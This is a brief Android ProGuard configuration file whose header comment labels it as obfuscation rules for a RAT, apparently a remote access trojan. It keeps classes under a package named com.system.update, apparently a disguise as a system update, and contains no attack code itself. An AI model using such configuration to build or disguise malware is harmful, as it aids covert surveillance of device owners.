# Obfuscation rules for RAT
-keep class com.system.update.** { *; }
-keep class okhttp3.** { *; }
-keep class com.google.gson.** { *; }
-keepattributes SourceFile,LineNumberTable
-renamesourcefileattribute SourceFile
-ignorewarnings